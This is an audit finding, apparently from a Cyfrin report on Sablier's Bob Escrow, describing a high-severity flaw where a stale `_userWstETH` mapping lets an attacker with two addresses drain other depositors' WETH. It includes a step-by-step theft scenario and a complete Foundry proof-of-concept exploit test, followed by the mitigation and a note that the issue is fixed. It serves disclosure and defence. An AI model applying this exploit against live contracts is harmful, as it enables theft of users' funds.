---
tags:
  - lang/solidity
  - lang/vyper
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - sector/liquid-staking
  - sector/streaming
  - sector/token
protocol: "[[Sablier]]"
auditors:
  - "[[MrPotatoMagic]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md"
genome:
  - "[[state-update]]"
  - "[[direct-drain]]"
  - "[[cross-contract-state-consistency]]"
---
# Adapter vault `_userWstETH` not cleared after redemption enables theft of other users' funds

- id: 65582
- impact: HIGH
- protocol: [[Sablier]] Bob Escrow
- reporter: MrPotatoMagic (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md

## Summary


The bug report describes an issue in the SablierBob smart contract where the `_userWstETH` mapping in the SablierLidoAdapter is not properly cleared or decremented when a user redeems shares from an adapter vault. This can allow an attacker with two addresses to steal WETH from other depositors in the same vault by exploiting the stale data in the `_userWstETH` mapping. A proof of concept test is provided to demonstrate the vulnerability. The recommended mitigation is to add a state-changing function in the adapter to clear the `_userWstETH` data after redemption. The issue has been fixed in a recent commit and verified by the Cyfrin team.

## Details

**Description:** When a user redeems shares from an adapter vault via `SablierBob::redeem`, their shares are burned but the `_userWstETH` mapping in `SablierLidoAdapter` is never cleared or decremented. This contrasts with `SablierBob::exitWithinGracePeriod` which correctly clears `_userWstETH` and decrements `_vaultTotalWstETH`.

The root cause is in `BobVaultShare::_update` (`BobVaultShare.sol:107-118`):
```solidity
if (from != address(0) && to != address(0)) {
    ISablierBob(SABLIER_BOB).onShareTransfer(VAULT_ID, from, to, amount, fromBalanceBefore);
}
```
Burns (where `to == address(0)`) do not trigger `SablierBob::onShareTransfer`, so `SablierLidoAdapter::updateStakedTokenBalance` is never called. And `SablierLidoAdapter::calculateAmountToTransferWithYield` (`SablierLidoAdapter.sol:153-193`) is a `view` function that reads `_userWstETH` but never modifies it.

In `redeem` (`SablierBob.sol:290-373`), the flow is:
1. Burn shares (line 323) - `_userWstETH` NOT cleared
2. Unstake if needed (lines 328-334)
3. Call `calculateAmountToTransferWithYield` (line 338-339) - reads stale `_userWstETH`
4. Transfer tokens (line 369)

Compare with `exitWithinGracePeriod` which calls `SablierLidoAdapter::unstakeForUserWithinGracePeriod` (`SablierLidoAdapter.sol:290-306`):
```solidity
_userWstETH[vaultId][user] = 0;           // CLEARED
_vaultTotalWstETH[vaultId] -= userWstETH; // DECREMENTED
```

**Impact:** An attacker controlling two addresses can steal WETH from other depositors in the same vault:

1. Attacker A, attacker B, and victim C each deposit 100 WETH into an adapter vault. State: `_userWstETH[A]=100`, `_userWstETH[B]=100`, `_userWstETH[C]=100`, `_vaultTotalWstETH=300`
2. Vault settles/expires. `unstakeFullAmount` converts 300 wstETH to 330 WETH (includes yield). `_wethReceivedAfterUnstaking=330`
3. A calls `redeem`: shares burned, `calculateAmountToTransferWithYield` computes `userWethShare = 100 * 330 / 300 = 110`. A receives ~110 WETH. **But `_userWstETH[A]` is still 100**
4. B transfers all shares to A via ERC20 transfer. `updateStakedTokenBalance` moves B's 100 wstETH to A. Now `_userWstETH[A] = 100 (stale) + 100 (transferred) = 200`
5. A calls `redeem` again with B's shares: `userWethShare = 200 * 330 / 300 = 220`. A receives ~220 WETH
6. Total attacker receives: ~110 + ~220 = ~330 WETH (all vault funds). Victim C's `redeem` reverts - no WETH remains

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/redeem/redeemPoC.t.sol`:

```solidity
/// When a user redeems from an adapter vault, shares are burned but _userWstETH in the
/// adapter is NEVER cleared. An attacker with two addresses can:
/// 1. Redeem from address A (wstETH tracking persists despite shares being burned)
/// 2. Transfer shares from address B to A (wstETH compounds on stale data)
/// 3. Redeem again from A with inflated wstETH ratio, draining other users' funds
function test_PoC_StaleUserWstETH_FundTheft() external {
    uint256 vaultId = createVaultWithAdapter();
    uint128 amount = WETH_DEPOSIT_AMOUNT; // 1e18

    // Three users deposit: depositor (attacker A), depositor2 (attacker B), alice (victim)
    setMsgSender(users.depositor);
    bob.enter(vaultId, amount);
    uint128 wstETH_initial = adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor);

    setMsgSender(users.depositor2);
    bob.enter(vaultId, amount);

    setMsgSender(users.alice);
    bob.enter(vaultId, amount);

    // Simulate yield: lower wstETH rate = more stETH per wstETH when unwrapping
    wsteth.setExchangeRate(0.818e18);

    // Warp past expiry and unstake
    vm.warp(EXPIRY + 1);
    bob.unstakeTokensViaAdapter(vaultId);

    uint256 totalWeth = adapter.getWethReceivedAfterUnstaking(vaultId);
    assertGt(totalWeth, 3e18, "yield should produce > 3 WETH from 3 deposits");

    // Attacker A redeems
    setMsgSender(users.depositor);
    uint256 wethBefore = IERC20(address(weth)).balanceOf(users.depositor);
    bob.redeem(vaultId);
    uint256 firstRedeem = IERC20(address(weth)).balanceOf(users.depositor) - wethBefore;

    // *** BUG: _userWstETH is NOT cleared after redeem ***
    assertEq(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETH_initial,
        "BUG: _userWstETH unchanged after redeem (should be 0)"
    );

    // Attacker B transfers all shares to attacker A
    setMsgSender(users.depositor2);
    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    shareToken.transfer(users.depositor, shareToken.balanceOf(users.depositor2));

    // wstETH[A] = stale_amount + transferred_amount = INFLATED
    assertGt(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETH_initial,
        "BUG: wstETH inflated from stale + transferred"
    );

    // Attacker A redeems AGAIN with inflated wstETH
    setMsgSender(users.depositor);
    wethBefore = IERC20(address(weth)).balanceOf(users.depositor);
    bob.redeem(vaultId);
    uint256 secondRedeem = IERC20(address(weth)).balanceOf(users.depositor) - wethBefore;

    // Attacker received more than their legitimate 2/3 share
    assertGt(
        firstRedeem + secondRedeem,
        (totalWeth * 2) / 3,
        "EXPLOIT: attacker received more than legitimate 2/3 share"
    );

    // Victim alice tries to redeem - REVERTS because WETH was drained
    setMsgSender(users.alice);
    assertGt(shareToken.balanceOf(users.alice), 0, "alice still has shares");
    vm.expectRevert();
    bob.redeem(vaultId);
}
```

Run with: `forge test --match-test test_PoC_StaleUserWstETH_FundTheft -vvv`

**Recommended Mitigation:** Add a state-changing function in the adapter to clear `_userWstETH` after redemption, and call it from `redeem`:

```solidity
// In SablierLidoAdapter, add:
function clearUserWstETH(uint256 vaultId, address user) external onlySablierBob {
    uint128 userWstETH = _userWstETH[vaultId][user];
    _userWstETH[vaultId][user] = 0;
    _vaultTotalWstETH[vaultId] -= userWstETH;
}

// In SablierBob::redeem, after calculateAmountToTransferWithYield:
vault.adapter.clearUserWstETH(vaultId, msg.sender);
```

Alternatively, change `calculateAmountToTransferWithYield` from a `view` function to a state-changing function that clears the user's wstETH data.

**Sablier:** Fixed in commit [e7b4f7f](https://github.com/sablier-labs/lockup/commit/e7b4f7f22fa838da70d36e7555570fc3032f9705). The old `calculateAmountToTransferWithYield` view function has been replaced with `SablierLidoAdapter::processRedemption`, which is a state-changing function called from `SablierBob::redeem` that explicitly clears the user's `wstETH`.

The redeem flow also now burns shares after `processRedemption` so the `wstETH` data is consumed before the burn.

**Cyfrin:** Verified.


\clearpage
